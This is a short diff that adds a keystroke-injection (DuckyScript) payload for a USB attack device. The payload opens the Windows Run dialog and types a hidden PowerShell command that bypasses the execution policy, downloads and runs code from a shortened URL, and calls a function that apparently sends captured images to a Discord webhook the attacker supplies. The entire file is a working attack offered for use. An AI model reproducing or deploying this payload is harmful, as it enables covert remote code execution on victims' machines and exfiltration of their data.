@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass -W H irm "t.ly/lzcXK"|iex; Get-Pic -wh "YOUR DISCORD WEBHOOK"
+DELAY 300
+ENTER
+
+
